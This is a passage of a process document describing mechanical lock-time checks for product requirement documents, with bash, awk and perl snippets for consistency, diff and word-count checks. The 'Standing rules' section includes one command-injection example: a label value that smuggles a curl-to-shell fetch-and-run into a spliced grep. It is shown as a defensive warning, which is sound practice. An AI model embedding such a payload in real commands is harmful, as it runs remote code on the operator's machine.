# Mechanical checks

No lens can run these. Each lens is briefed on one document and disposes rows one by one; these
checks compare documents, compare a document against its own indexes, or compare the current text
against the revision it amends. **The orchestrator runs them itself and records the result** — what
was checked, the result of each check, and for each miss the fix or the post-lock item — in the
review log's lock record.

**"By script" means programmatically rather than by eye. It does not mean a maintained CLI.** This
file lists each check with its exact method; the orchestrator writes a **throwaway script per run**,
against the repo in front of it, and throws it away. That is deliberate: every check below depends
on the target repo's layout — where the product docs live, how the PRD's tables are split, which
companions exist, what the base revision is — so a shipped checker would need to be configured for
each project before it could run at all, and a stale configuration fails silently, which is the one
failure mode these checks exist to prevent. Five conversions of locked PRDs in one project were run
this way and no drift in method was observed; that is five runs, one project, one author, and no
instrument that would have detected drift had it occurred.

If a shipped checker is ever wanted, it belongs **beside the review gate in the `agent-dispatch`
plugin**, where the gate's own CLI already lives and already knows how to be pointed at a repo. It
does not belong in this skill. This skill ships the method.

---

## How a result is recorded

**Every check reports exactly one of three results: PASS, MISS, or NOT-RUN with a reason.**

- **PASS** — the check ran, its subject existed and was non-empty, and the assertion held.
- **MISS** — the check ran and the assertion failed. Each miss carries its fix or its post-lock
  item.
- **NOT-RUN** — the check could not execute: a file it reads is absent or empty, an enumeration it
  depends on came back empty, a base revision does not exist, a tool is missing. The reason is
  recorded in the same words as the check's own guard.

**A check asserts that its subject exists and is non-empty before it asserts anything about the
subject's content.** An empty search result over an absent, empty or mistyped subject is **NOT-RUN,
never PASS.** The worked case is check 12: run its word count against a mistyped slug and it prints
`0` and exits `0`. Zero words is under every budget, so a typo in a path reads as the most
comfortable pass in this file. Every check below can fail that way, which is why the record has
three states rather than clean-or-miss.

Mechanically, that is three habits. Every throwaway script opens with

```bash
set -euo pipefail
```

so a failed producer in a pipeline cannot be laundered into an empty result by its consumer. Every
check that reads a file guards it:

```bash
[ -s "$prd" ] || { echo "NOT-RUN: $prd is absent or empty"; exit 3; }
```

And every check that enumerates a set before comparing it asserts the enumeration is non-empty:

```bash
[ -s "$labels" ] || { echo "NOT-RUN: no labels extracted from $copy"; exit 3; }
```

Under `set -e`, a `grep` whose empty output is the passing case returns `1` and would abort the
script; write those as `grep … || true` and read the **output**, not the exit status — and remember
that an empty output is a PASS only once the subject guard above it has run.

**Lock requires zero NOT-RUNs**, or an owner fence that accepts each remaining NOT-RUN by name and
says why. The one standing exception is the diff checks on a first lock: the Applicability section
below states that reason in advance, so recording them NOT-RUN with that reason needs no fence.
Every other NOT-RUN does.

## Standing rules for every command

Each command block below assumes this header, with both parameters substituted:

```bash
set -euo pipefail
docs="{{product-docs-dir}}"    # a literal, shell-quoted path: not a glob, not an expansion
slug="<prd-slug>"
prd="$docs/$slug.md"
journeys="$docs/$slug-journeys.md"
copy="$docs/$slug-copy.md"
fences="$docs/$slug-fences.md"
oq="$docs/$slug-oq-results.md"
```

**Document-derived text is never interpolated into a command string.** A label, a constant name, a
heading, an ID or any other value read out of a document is passed as a **quoted shell variable**,
with `--fixed-strings` so it is matched literally and with `-e` (or a trailing `--` before file
arguments) so a value beginning with `-` cannot become an option. These checks run at lock time,
over a document the operator may not have authored — the conversion path points this skill at
someone else's locked PRD — so the text is untrusted input:

```bash
# WRONG — the label is spliced into the command text. A copy state whose action reads
# x'; curl -s http://host | sh; :'  executes at lock time.
grep -rnF '<label text>' {{product-docs-dir}} --include='*.md'

# RIGHT — the label is data, and the path is quoted.
while IFS= read -r label; do
  grep -rn --fixed-strings --include='*.md' -e "$label" -- "$docs" || true
done < "$labels"
```

**Every path is quoted.** `"$docs"`, `"$prd"`, `"$docs/$slug-copy.md"`. The substituted value of
`{{product-docs-dir}}` must be a literal, shell-quoted path. Unquoted, a path containing a space
word-splits, the search runs against arguments nobody intended, it hits nothing — and a check whose
pass rule is "no hits" reads that fail-open as a PASS on the lock gate.

**Name the regex engine.** Three dialects appear in this file, and a command that assumes the wrong
one fails silently rather than loudly — see check 12, where an awk word-boundary escape emptied an
extraction that then read as clean. `awk` is the third: BSD awk has no word-boundary escape at all,
GNU awk spells it `\y`, and neither accepts `--` as an end-of-options marker for file arguments, so
an awk pattern here uses an explicit character class instead of a boundary escape and passes its
file without `--`. POSIX ERE has no lookaround: `grep -E` errors on `(?<!…)` and `(?=…)`,
and BSD `grep` has no `-P` at all. Where a pattern below uses a lookahead or a lookbehind, run it
under `perl -ne`, `python3 -m re`, or `rg -P`, and record in the lock record which one the run used.

Never paste a path or a pattern from another project's run.

## Applicability

**Checks 1–7, 10–13 and 15–19 run on both paths** — authoring and conversion — every time they are
run at all.

**Check 8's second direction, check 9 and check 14 are DIFF CHECKS.** They compare this document
against the revision it amends, so they run **on the conversion path and on any re-lock**. On a
first lock there is no prior locked revision: `git show <base>:…` is a fatal error, and check 8's
"every touched ID is carried by a fence" fails for every ID in the document, all of which are new.
On a first lock each is recorded **NOT-RUN (reason: first lock, no prior locked revision)**. Check
8's first direction — every row the fence map names still exists — reads only the current text and
runs on both paths.

**`<base>` is the commit at which this document was most recently locked** — the commit whose tree
carries the `Status: locked (<date>)` the amendment starts from. It is not the branch point, not
`origin/main`, and not the last commit that touched the file. Resolve it once, at round 1, and
**record the resolved SHA in the fence-file header** beside the review-log path. Every diff check
records the `(base, head)` pair it ran against alongside its result; a result whose pair is not
recorded does not carry forward to a later run.

Use three dots, not two:

```bash
base="<base-sha>"
head="$(git rev-parse HEAD)"
git diff -U0 "$base"...HEAD -- "$docs"
```

`<base>...HEAD` diffs against the merge base, so commits that landed on the trunk after this
amendment forked stay out of the amendment's evidence. `<base>..HEAD` imports them, and the
amendment is then asked to account for rows somebody else changed.

---

## The carried-over checks

### 1. Cross-PRD consistency, both directions

**What.** Every PRD this document cites **or is cited by** — the direction does not matter and the
citation need not be reciprocal.

**Method.** Two halves, and each grep serves exactly one of them.

*Outbound* — read off this document alone. This grep necessarily hits the document under test;
that is the point of it. Collect every markdown link whose target is another `.md` file, plus every
unlinked cite naming a sibling by one of the `{{sibling-document-name}}` values the build contract
carries:

```bash
[ -s "$prd" ] || { echo "NOT-RUN: $prd is absent or empty"; exit 3; }
grep -nE '\[[^]]*\]\([^)]*\.md[^)]*\)' -- "$prd" || true
```

*Inbound* — **not derivable from this document**, so enumerate the sibling PRDs and their
companions in `"$docs"` and search them for two things: path or link references to this PRD's slug,
and this document's own requirement-section prefixes, derived from its `### <n>.` headings (section
7 gives `R7.`). This grep must **exclude** the document under test and its own companions; their
hits are the outbound half.

```bash
prefixes="$(grep -oE '^### [0-9]+\.' -- "$prd" | grep -oE '[0-9]+' | sort -un \
  | sed 's/^/R/; s/$/\\./' | paste -sd'|' -)"
[ -n "$prefixes" ] || { echo "NOT-RUN: no requirement-section headings found in $prd"; exit 3; }
grep -rnE --include='*.md' --exclude="$slug*.md" -e "$slug|($prefixes)[0-9]" -- "$docs" || true
```

Do **not** search for the bare ID families as a class. Every sibling carries `R…`, `E…` and `M…`
IDs of its own, so that alternation matches nearly every sibling document in the tree and hands the
orchestrator a near-universal set to prune by hand — which puts the memory-based enumeration back
exactly where this check removed it.

Every pair the two sets produce gets all five checks:

a. **Obligations agree both ways.** Every line in this PRD's outbound obligations table that names
   another document has its counterpart in that document's inbound table, and each side names the
   rows that carry it. A line with no counterpart is a defect on both ends, not one.
b. **Shared rows agree on priority.** Where one document says a row "moves into" or "is in" a build
   phase, the other's `Pri` cell says the same. A conditional in one ("P1 unless the import lands
   first") is matched in the other or appears in neither. This comparison is only meaningful once
   check 19 has confirmed each document declares exactly one priority semantic.
c. **Every cross-PRD cite names its owning document in its visible label** — "the device
   document's `R6.27`", never a bare `R6.27` — because the row-ID families repeat across documents
   and a bare ID resolves to the wrong row in the reader's head. Check this **by target, not by
   label shape**: collect every `[label](target)` whose target has a path part resolving to a file
   other than this document or its own companions, and assert the label contains one of the
   `{{sibling-document-name}}` values. Flag every link that does not.

   ```bash
   grep -onE '\[[^]]*\]\([^)]*\)' -- "$prd" || true
   ```

   Then the unlinked cite, which no link pattern can see. Search this document for bare ID tokens
   whose section prefix or family this document does not own, and read each hit: one whose
   surrounding text names no owning document is a defect.

   ```bash
   id_cite='(^|[^`[:alnum:]./-])(R[0-9]+\.[0-9]+[a-z]?|E[0-9]+|M[0-9]+|F[0-9]+)\b'
   grep -nE "$id_cite" -- "$prd" || true
   ```

   This document cites its own rows constantly, so an empty result here is NOT-RUN, not PASS.
d. **Retired and moved IDs are recorded on both ends** — retired in the source document's
   Traceability retired-ID list, and recorded in the destination that now owns the rule.
e. **Fences are qualified by document.** Fence numbering is per PRD, so a fence cited from another
   PRD carries its owning document in the label exactly as a row does.

**Failure looks like.** An obligation stated on one side only; the same row at P0 here and P1
there; `[row R6.27](../device.md)` whose label names no document; a bare `R6.27` in a sentence; an
ID retired in the Legend but never recorded where it went; an `F12` cite that does not say whose
`F12`.

### 2. Index sync

**What.** Every index inside this document agrees with the content it indexes.

**Method.** Derive the fence-to-row map **from the fence file** — parse each `### F<n>` section's
**Carried by** line and build the map programmatically; do not read the map section and trust it.
Diff the derived map against the fence file's own **Fence → row map** section. The `Carried by`
line is a comma-separated list of bare IDs, each optionally prefixed by its owning document, so the
parse is literal; a `Carried by` that does not parse is a MISS, not a NOT-RUN — the grammar is part
of the format.

Then cross-check the Legend's lists (constants and closure gates, build dependencies, the two
bullets for P0 rows deferring to an open question with no interim rule and for interims stated) and
the Surfaces table's copy states against the marks in the companions: every copy state named under
a surface exists in the copy companion, every state in the copy companion appears under exactly one
surface unless the Surfaces preamble declares it shared, and phase marks agree between the two.

**Derive the Legend/Open-Questions condition rather than asserting it.** The lock condition is
stated in two places and computed in none, so compute it here, in both directions:

- For every Open Questions row whose `Interim rule` cell is **empty**, take every ID in its `Feeds`
  cell whose row's `Pri` is `P0`, and assert that ID appears in the Legend's "P0 rows that defer to
  an open question with no interim rule" bullet.
- Assert the reverse: no ID appears in that bullet that this derivation does not produce.
- Run the same two directions for the **Interim stated** bullet, from the rows whose open question
  *does* carry an interim rule. The two bullets are never merged, so the two derivations stay
  separate.

Subject guard: if the Open Questions section is absent or its table does not parse, this is
NOT-RUN. If the table parses and carries zero rows, the derived sets are legitimately empty and
both Legend bullets must be empty too — that is a PASS.

**Failure looks like.** A fence whose Carried-by names a row the map omits; a map line reading "see
the lists above" instead of naming rows; a surface listing a copy state the companion does not
have; a phase mark on a state in one file and not the other; a P0 row deferring to an
interim-less open question that the Legend's bullet never names. Every miss is an editorial edit —
fix it before the round, not after.

### 3. Latent-decision inventory

**What.** The decisions the document has already made without anyone noticing it made them.

**Method.** Enumerate four classes and turn each hit into an Open Question or an owner adjudication
**before** the pre-lock round. Each class has an operation; none of them is a judgment made from
memory.

- **Constants without an OQ** — a named constant in the constants-and-closure-gates table whose
  closure-evidence cell names no open question. Parse the table; assert each `Closure evidence`
  cell carries an OQ number that resolves in the Open Questions table.
- **Copy states with no producing row** — an `E<n>` in the copy companion that no requirement row
  causes. Parse the copy companion's `E<n>` sections, and for each assert some requirement row's
  text or the copy index's `Owning rows` cell names it.
- **Rows an upstream document places higher** — inputs are the parameterized upstream paths
  `{{upstream-vision-path}}` and `{{upstream-strategy-path}}`, plus every sibling PRD the build
  contract names. Operation: grep those documents for this PRD's row IDs and for the product-area
  name, and produce the list of hits with each cited row's local `Pri`. The orchestrator reads each
  hit against that `Pri`; a capability an upstream document puts in the first build phase that a
  row here marks P1 or P2 is a latent decision. If the upstream paths are unset or the files are
  absent, this class is NOT-RUN with that reason — it is not a PASS.
- **Undefined terms the rows lean on** — tokenize the bold and quoted terms out of the
  `Requirement` cells of every requirement table and out of the `Given` and `Assert` cells of the
  journeys companion, and diff them against the term list parsed from the Vocabulary section. Build
  the term list from the rows, not from memory.

  ```bash
  vocab="$(mktemp)"; terms="$(mktemp)"
  sed -n '/^### Vocabulary$/,/^### /p' "$prd" \
    | grep -oE '^- \*\*[^*]+\*\*' | sed -E 's/^- \*\*//; s/\*\*$//' | sort -u > "$vocab"
  [ -s "$vocab" ] || { echo "NOT-RUN: Vocabulary list parsed empty"; exit 3; }
  grep -ohE '\*\*[^*]+\*\*|"[^"]+"' -- "$prd" "$journeys" \
    | sed -E 's/^\*\*//; s/\*\*$//; s/^"//; s/"$//' | sort -u > "$terms"
  comm -23 "$terms" "$vocab"
  ```

  The output includes quoted copy labels (check 13's subject) and bold used for emphasis, so it is
  a list to read; what it cannot do is miss a term the rows use.

**Failure looks like.** A named constant with no open question that closes it; a copy state no row
causes; a row at P1 or P2 that an upstream document places in the first build phase; a term a
requirement or an Assert leans on that Vocabulary does not define. Each of those is a decision this
document has already made and has not recorded as one.

---

## The added checks

### 4. Row-transition index against the rows

**Method.** Parse the row-transition table (`Starting state | Event | Result | Rows`).

**First, agree the state vocabulary, before using it as a basis.** Build set A from the transition
table's `Starting state` and `Result` cells; build set B from the Vocabulary terms marked as states
(`- **<term>** (state) — …`). Assert both are non-empty — an empty one is NOT-RUN — and assert
`A = B`. A name in one and not the other is a **MISS reported before the rest of this check runs**:
enumerating from Vocabulary alone means a state the rows use and Vocabulary omits silently shrinks
the search below, and the check then passes on a smaller question than the one it claims to ask.

Then, with the agreed set: separately enumerate every requirement row whose text changes the state
of the entity this PRD governs, by searching the requirement tables for those state names, passed
as quoted variables. For each such row, assert its ID appears in at least one `Rows` cell of the
transition table, and that no two table lines carry the same `Starting state` + `Event` pair.
Enumerate the routes **from the rows**, not from the table and not from memory — the table is the
thing under test.

Keep that grep wide: it matches rows that **mention** a state, while the criterion is rows that
**change** one, so it will always return some rows that belong in neither. Dispose them, do not
narrow the grep — narrowing it to transition verbs would reintroduce the memory-based enumeration
this check exists to remove. A row that describes behaviour **in** a state without moving the entity
between states — a per-state response or display rule — is **disposed, and the disposition is
recorded**, so that "I did not see it" and "I saw it and disposed it" do not look alike in the lock
record. The inverse is the trap worth the attention: a row that does transition but is phrased in
per-state language is still a MISS.

**Failure looks like.** A state the rows use that Vocabulary does not mark; a route a row can cause
that the table omits (two reviewers caught one this way in the first rewrite of this format); the
same route listed twice; a `Rows` cell naming an ID that no longer exists.

### 5. Variant set, both directions

**Method.** The copy companion writes one `### E<n> — <state>` section per state, each field on
its own line as `- <Field>: <value>`, so the extraction keys on a literal prefix. For each state,
build set A from its `- Variant: "…"` lines. Build set B from the requirement row named in that
state's `- Variants enumerated by:` field: read that row in the PRD and parse the variant set it
enumerates. Take the set difference in **both** directions per state; both must be empty.

```bash
[ -s "$copy" ] || { echo "NOT-RUN: $copy is absent or empty"; exit 3; }
grep -qE '^### E[0-9]+ ' -- "$copy" \
  || { echo "NOT-RUN: no E<n> sections parsed from $copy"; exit 3; }
grep -nE '^- (Variant|Variants enumerated by):' -- "$copy" || true
```

Dispositions, so that nothing lands as an N/A:

- A state with `- Variant:` lines whose `- Variants enumerated by:` reads `none` is a **MISS** —
  the variants are untestable without matching on wording, which process rule 9 forbids.
- A state whose `- Variants enumerated by:` names a row that does not exist is a **MISS**.
- A state with no variants and `- Variants enumerated by: none` is a PASS: both sets are empty and
  they agree.
- An absent copy companion is **NOT-RUN**, never an N/A.

**Failure looks like.** A variant in the copy file that no row enumerates — untestable without
matching on wording. Or an enumerated variant with no copy — a state the builder must invent text
for. Or a marker pointing at a row a renumber-free amendment nonetheless deleted.

### 6. Case references and copy-state coverage

**Method.** Collect every ID from the `Rows` cells of the journeys companion — the transition index
`T1..Tn` and every `UJ n` table — and assert each resolves to a live row ID in the PRD body; an ID
that resolves only to the retired list is a failure, not a pass. Then collect every `E<n>` from the
copy companion and assert each appears in at least one case. Both collections are guarded: an empty
`Rows` set or an empty `E<n>` set is NOT-RUN, since both files carry them by construction.

**Failure looks like.** A dangling `Rows` cite after a renumber that should never have happened; a
copy state with no case, which means nothing observes it.

### 7. Legend constants named in an owning row

**Method.** Parse the `Constant` column of the constants-and-closure-gates table. If the table is
present and carries no data rows, that is NOT-RUN (reason: no constants declared) — whether a
product with no named constant is right is check 3's first class, not this check's.

Then **restrict the search to the requirement tables**, by deriving their line ranges from the
`### <n>.` headings, and require a hit **inside a requirement row** — a table line whose first cell
is an `R<section>.<n>` ID. "At least one hit outside the Legend" is not enough: it passes when the
only other hit is in the Open Questions table, the build-dependencies table or the Surfaces table,
which is exactly the state this check exists to catch.

```bash
rows="$(mktemp)"
awk '/^### [0-9]+\./ {inseq=1} /^## [^#]/ {inseq=0} \
     inseq && /^\| *R[0-9]+\.[0-9]+[a-z]? *\|/' "$prd" > "$rows"
[ -s "$rows" ] || { echo "NOT-RUN: no requirement rows parsed from $prd"; exit 3; }
while IFS= read -r constant; do
  [ -n "$constant" ] || continue
  grep -qF -e "$constant" -- "$rows" \
    || printf 'MISS  %s — named in no requirement row\n' "$constant"
done < "$constants"
```

**Then the reverse assertion.** For each line of the constants table, for every ID in its
`Owning rows` cell: assert the ID resolves to a live requirement row, **and** assert that row's
text names the constant. A row listed as owning a constant it does not name is a miss on the same
footing as a constant no row names — the table claims a relationship the text does not carry.

**Failure looks like.** A constant that exists only in the Legend — a product parameter with no row
that uses it, which means no row is verifiable against it. Or a constant whose only mention outside
the Legend is in the Open Questions or build-dependencies table, which the old "outside the Legend"
pass rule admitted while its own failure line named it.

### 8. Fence map against content

**Method.** Two directions, with different applicability.

*Direction 1 — map against current text (both paths).* For every line of the fence file's
**Fence → row map**, assert each row, case, copy state and sibling fence it names still exists in
the current text.

*Direction 2 — changed content against the fences (diff check).* Derive what changed from the
**changed lines**, not from ID tokens found in the diff:

```bash
diff_out="$(mktemp)"; changed="$(mktemp)"
git diff -U0 "$base"...HEAD -- "$docs" > "$diff_out"
[ -s "$diff_out" ] \
  || { echo "NOT-RUN: empty diff against $base — wrong base, or nothing changed"; exit 3; }
grep -E '^[+-]' -- "$diff_out" | grep -vE '^(\+\+\+|---)' > "$changed"
[ -s "$changed" ] || { echo "NOT-RUN: no changed lines extracted from the diff"; exit 3; }
id_re='(R[0-9]+\.[0-9]+[a-z]?|E[0-9]+|M[0-9]+|T[0-9]+|UJ[0-9]+\.[0-9]+-[a-z])'
grep -E "^[+-]\| *$id_re *\|" -- "$changed" > "$id_lines" || true
grep -vE "^[+-]\| *$id_re *\|" -- "$changed" > "$idless_lines" || true
```

Then:

a. **A changed line that is a row of a dispositionable table** — its first cell is one of those IDs
   — must have that ID in some fence's **Carried by**, using the map derived in check 2.
b. **A changed line carrying no ID** must match an entry on this round's fix file authorized as
   editorial, or it is reported as an **unattributed change**. These are the lines an ID grep
   cannot see and the ones most worth seeing: the Legend's priority bullets, the phase rule, the
   status vocabulary, a Vocabulary bullet, either build-contract paragraph, the Labels or
   Placeholders rules, the harness statement, a journey's preamble line, the Surfaces preamble.
   SKILL.md names "a change to Legend priority semantics" as explicitly not editorial, and deriving
   the changed set from ID tokens yields the empty set for every one of them — an assertion that is
   vacuously true.

An empty ID set against a non-empty diff is **NOT-RUN, not PASS**. Record the `(base, head)` pair
with the result.

**Failure looks like.** A map entry pointing at text the rewrite deleted. A row changed on the
branch that no fence carries — an unratified WHAT, which is the defect this check exists for. Or a
Legend priority bullet rewritten on the branch with no fence and no editorial entry: an
unattributed change, which the ID-token form of this check could not see at all.

### 9. ID, priority and status diff against the base

**Method.** A diff check (see Applicability). Extract `(ID, Pri, Status)` triples from the base
revision and from `HEAD` and diff them — but the triple's shape is **per family**, because only the
requirement tables have a `Pri` column:

| Family | Table | Columns read |
|---|---|---|
| `R<section>.<n>` | the requirement tables | `ID`, `Pri`, `Status` |
| `E<n>` | the PRD's copy index | `ID`, `Status` (no `Pri`) |
| `E<n>` | the copy companion's per-state `- Status:` field | `ID`, `Status` (no `Pri`) |
| `M<n>` | the success-metrics table | `ID`, `Status` (no `Pri`) |

For the families with no priority column, write the `Pri` field as a literal `—`. Do not synthesize
one and do not let a missing column read as a changed value.

`E<n>` carries a status in **two** files, so the copy companion is an input to this check as well
as the PRD: assert the PRD copy index's `Status` and the copy companion's `- Status:` agree per
`E<n>`, at base and at HEAD. A disagreement is a MISS whether or not either side changed.

```bash
basefile="$(mktemp)"
git show "$base:$docs/$slug.md" > "$basefile" \
  || { echo "NOT-RUN: no $slug.md at $base (first lock, or wrong base)"; exit 3; }
[ -s "$basefile" ] || { echo "NOT-RUN: $slug.md at $base is empty"; exit 3; }
```

Then parse both files' tables into `ID|Pri|Status` lines, sort, and `diff`. Any ID **added, removed
or renumbered**, and any changed `Pri` or `Status` cell, must be named in a fence dated in this
amendment. The expected result for a conversion is an empty diff apart from the fenced lines: an
amendment is not an implementation completion. Record the `(base, head)` pair with the result.

**Failure looks like.** A renumbered ID (never legal); a status flipped to `done` because the
rewrite describes behavior that has since been built; a priority quietly raised to match a sibling;
an `E<n>` marked `aligned` in the PRD's index and `pre-alignment` in the copy companion.

### 10. Two-sentence scan

**Method.** Over every requirement cell — and every other dispositionable rule cell — strip inline
code spans and link targets (keep the label), then count sentence terminators with:

```
[.!?]["')\]]*(?=\s+["'(\[]*[A-Z]|\s*$)
```

More than two is a candidate.

**Engine.** That pattern uses a lookahead, which POSIX ERE does not have: `grep -E` errors on it
and BSD `grep` has no `-P`. Run it under `perl -ne`, `python3 -m re`, or `rg -P`, and record which:

```bash
[ -s "$cells" ] || { echo "NOT-RUN: no dispositionable cells extracted"; exit 3; }
perl -ne 'print if (() = /[.!?]["\x27)\]]*(?=\s+["\x27(\[]*[A-Z]|\s*$)/g) > 2' -- "$cells"
```

Requiring a following capital or end-of-cell is what keeps `2.5` from counting. The earlier form of
this pattern used a `(?<![0-9])` lookbehind instead, which **under**-counted: it dropped every
sentence ending in a digit, so a three-sentence cell ending in numerals never reached the human's
list at all — while the prose warned only about over-counting. This form still over-counts on
abbreviations ("e.g.") and still misses a terminator followed by a sentence opening with a digit or
a lowercase word. So treat its hits as **a list to read, not a verdict**; the rule itself is
process rule 7 and a human confirms each hit.

**Failure looks like.** A three-sentence row where the third sentence carries rationale, an evidence
cite or a fence cite — all of which belong outside the cell.

### 11. Relative link and anchor resolution

**Method.** Over the **whole product-docs tree**, not just this PRD. Collect every
`[label](target)`; an empty collection is NOT-RUN. For a target with a path part, resolve it
relative to the containing file and assert the file exists. For a `#anchor` part, compute the
anchor set of the target file by **GitHub's slug rules**, applied to the heading's **rendered
text**: first resolve inline markdown to its text content — `**bold**`, `_emphasis_`, `` `code` ``
and `[label](target)` all reduce to the label or the inner text — then lowercase what remains; drop
everything that is not a letter, a digit, a space, a hyphen or an underscore (so `.`, `,`, `:`,
`(`, `)`, `'`, `"` and emoji all disappear); replace each space with a hyphen; keep existing
hyphens; and where two headings slug identically, the second and later get `-1`, `-2` … in document
order. Assert the anchor is in that set.

**Failure looks like.** A link to a file the rewrite renamed; an anchor that renders to nothing on
GitHub because the heading it names carries a code span or trailing punctuation the slug drops; an
anchor computed from the raw heading source, which keeps the asterisks a reader never sees. The
stable `### UJ n. <name>` headings in the journeys companion exist so this check keeps passing
across amendments — a heading reworded is a broken anchor in every sibling.

### 12. Word count by the fixed method

**Method.** PRD body only for the budget; companions excluded from it. Strip, in this order: HTML
comments, fenced code blocks, link targets (keeping the label), and table pipes including the `---`
separator rows. Count whitespace-separated tokens in what is left.

````bash
[ -s "$prd" ] || { echo "NOT-RUN: $prd is absent or empty"; exit 3; }
perl -0777 -pe 's/<!--.*?-->//gs; s/^```.*?^```//gms; s/\[([^\]]*)\]\([^)]*\)/$1/g;
                s/^\s*\|[-: |]+\|\s*$//gm; s/\|/ /g' -- "$prd" | wc -w
````

Compare against the project-supplied budget (default 12,000).

Two properties of that command are worth knowing rather than discovering. Without the guard above
it, a mistyped slug makes it print `0` and exit `0`, and zero words is under every budget — the
typo reads as a pass; `set -o pipefail` is what stops a `perl` failure from reaching `wc -w` as an
empty stream. And the fenced-block strip matches only a **closing fence at column 0**, so a code
block indented inside a list item is not stripped and its contents are counted; unindent it or
strip it by hand, and say in the record which was done.

**Report the companions' counts beside the body count**, by the same method, as **unbudgeted
context — not a budget.** The body number can improve while the thing it proxies gets worse: prose
moved out of the body into a companion lowers the count and raises the total a reader must hold,
and the budget alone cannot see it. A body drop paired with a companion jump is the signature of a
rule migration, not a compaction.

**Rule migration.** In each companion, find every sentence carrying a modal — `must`, `may not`,
`is shown`, `renders` — and assert it sits adjacent to a citation of an owning row ID in the same
cell, line or bullet.

Scan only each companion's **content** section — everything from its first content heading onward
(`## States`, `## Journeys`, `## Fences`, or the OQ-results companion's first `## OQ <id>`, which is
that file's first content heading by construction). What precedes that heading is the format
describing itself: the entry grammar, the quote rule, the phase-mark grammar, the harness statement.
Those sentences carry modals by their nature ("`Headline:` — the headline as it renders") and cite
no row because they are not product rules, so scanning them reports the template's own prose as a
migrated rule on every conforming document — a false alarm that would train an orchestrator to
ignore the check's real hits:

```bash
for f in "$journeys" "$copy" "$fences" "$oq"; do
  [ -s "$f" ] || { echo "NOT-RUN: $f is absent or empty"; continue; }
  content=$(mktemp)
  awk '/^## (States|Journeys|Fences|Results|OQ)([^A-Za-z0-9]|$)/ {c=1} c' "$f" > "$content"
  [ -s "$content" ] || { echo "NOT-RUN: no content section extracted from $f"; rm -f "$content"; continue; }
  printf '\n== %s\n' "$f"
  grep -nE 'must|may not|is shown|renders' "$content" \
    | grep -vE '(R[0-9]+\.[0-9]+[a-z]?|E[0-9]+|M[0-9]+)' || echo '   (none uncited)'
  rm -f "$content"
done
```

Three things in that command are load-bearing, and each was a live false green before it was fixed.
**`awk` takes no `--`**: it reads the marker as a filename and dies (`awk: can't open file --`) on
both BSD and GNU awk. **`\b` is not a word boundary in an awk ERE**: BSD awk has no such escape and
GNU awk spells it `\y`, so `\b` matches a backspace, the heading never matches, and the extraction
is empty. **An empty extraction is indistinguishable from a clean one** once it reaches the grep,
which prints `(none uncited)` and reads as PASS over a file nothing was searched in. Hence the
materialised `$content` and the `[ -s ]` guard: a companion whose content section did not extract is
NOT-RUN, not PASS — a companion with no content section is a companion nothing was checked in.

A modal sentence in a companion's content with no owning-row cite is a rule that has left its home,
which process rule 11 forbids: a rule lives in an ID-carrying row and everything else restates and
cites.

**Failure looks like.** Over budget. The response is a compaction pass under process rules 7, 8 and
11 — trim rule-free prose, move restatement out. Never raise the budget; a document that cannot fit
is two PRDs. Or a body count that fell while a companion's rose, with an uncited modal sentence in
that companion to say where the rule went.

### 13. The standing label check, run

**Method.** The copy index's Labels rule declares a runnable search over the whole product-docs
tree. **Run that command, this round, and record its output** — the check is the run, not the
existence of the command. Both directions run; each is what finds one of the two failures below.

*Direction 1 — every label, out into the tree.* The copy companion's quote marks identify a
checkable label: the `- Actions:` and `- Variant:` lines carry them and the prose fields do not.
Extract those labels and search the tree for each, passing the label as a quoted variable:

```bash
for f in "$copy" "$prd" "$journeys"; do
  [ -s "$f" ] || { echo "NOT-RUN: $f is absent or empty"; exit 3; }
done
labels="$(mktemp)"
grep -hE '^- (Actions|Variant):' -- "$copy" | grep -o '"[^"]*"' \
  | sed 's/^"//; s/"$//' | sort -u > "$labels"
[ -s "$labels" ] || { echo "NOT-RUN: no quoted labels extracted from $copy"; exit 3; }
while IFS= read -r label; do
  printf '\n== %s\n' "$label"
  grep -rn --fixed-strings --include='*.md' -e "$label" -- "$docs" || echo '   (no other mention)'
done < "$labels"
```

Every label must be written once in the copy companion and only **quoted** elsewhere.

*Direction 2 — every quoted string in a row or a case, back into the copy companion.* Extract every
quoted string from the requirement rows and from the journeys companion's `When` and `Assert`
cells, and assert each resolves character-for-character to a label the copy companion provides:

```bash
quoted="$(mktemp)"
{ awk '/^\| *R[0-9]+\.[0-9]+[a-z]? *\|/' "$prd"
  awk -F'|' '/^\| *(T[0-9]+|UJ[0-9]+\.[0-9]+-[a-z]) *\|/ {print $4 $5}' "$journeys"; } \
  | grep -o '"[^"]*"' | sed 's/^"//; s/"$//' | sort -u > "$quoted"
[ -s "$quoted" ] || { echo "NOT-RUN: no quoted strings extracted from rows or cases"; exit 3; }
comm -23 "$quoted" "$labels"   # quoted in a row or a case; provided by no copy state
```

Direction 1 alone cannot find this: it seeds only from the copy companion, so an action a row names
that no copy state provides produces no seed and is structurally invisible to it.

**Failure looks like.** A label with a second home — a row or a journey that states the string
instead of quoting it, so the two drift. Or an action a row names that no copy state provides,
which is a builder inventing user-facing text at build time.

### 14. Post-lock ticks true and attributed to a change record

**Method.** A diff check (see Applicability). For every checkbox this change flips to ticked, do
both: read the text it claims and assert the claim is true of the document as it now stands; and
assert the tick's attribution names **a change record that survives a squash-merge** — a pull
request, a merge request, or an equivalent changeset reference with a stable identifier. A bare
commit SHA is not one.

```bash
git diff "$base"...HEAD -- "$docs" | grep -E '^\+.*\[[xX]\]' || true
```

The tick pattern is case-insensitive on the mark: `- [X]` renders as ticked, so a `\[x\]` pattern
misses every capitalized tick and reports a clean run over a document it never looked at. An empty
result is a PASS only when the diff itself was non-empty; otherwise it is NOT-RUN. Record the
`(base, head)` pair with the result.

**Failure looks like.** A tick whose claim the text does not support — the item was ticked because
it was discussed. Or a tick attributed to a SHA, which stops resolving the moment the branch is
squashed on merge, leaving an item that claims to be closed by nothing a reader can open.

### 15. Unresolved fill

**What.** Both placeholder families are gone, in the PRD and in all four companions.

**Method.** `{{param}}` is substituted at scaffold time and `_(prompt)_` is filled during
authoring; an unresolved instance of **either** is a lock-blocking defect. Sweep for both, and
separately for the `<prd-slug>` token, which is a substitution parameter outside the `{{…}}` family
and which the `{{…}}` sweep therefore cannot see:

```bash
files=("$prd" "$journeys" "$copy" "$fences" "$oq")
for f in "${files[@]}"; do
  [ -s "$f" ] || { echo "NOT-RUN: $f is absent or empty"; exit 3; }
done
grep -nE '\{\{|_\([^)]*\)_' -- "${files[@]}" || true
grep -nF -e '<prd-slug>' -- "${files[@]}" || true
```

Both must return nothing.

**Failure looks like.** A fence whose `**Authority:**` still reads `_(link to the owner comment or
